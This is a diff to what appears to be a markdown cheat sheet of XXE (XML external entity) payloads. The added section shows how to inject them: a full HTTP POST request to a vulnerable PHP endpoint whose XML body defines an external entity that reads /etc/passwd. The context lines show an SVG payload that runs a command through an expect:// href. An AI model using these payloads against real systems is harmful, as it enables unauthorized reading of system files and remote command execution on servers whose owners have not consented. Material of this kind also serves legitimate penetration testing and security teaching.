@@ -106,3 +106,25 @@
     <image xlink:href="expect://ls"></image>
 </svg>
 ```
+
+## How to injection these payloads?
+
+**You can inject these payload in request like this:**<br>
+You can see the payload is injected below the headers. Hope you understood! :)
+```XML
+POST /xml_injectable.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 158
+Host: 192.168.242.139
+Content-Type: application/x-www-form-urlencoded
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [  
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+```
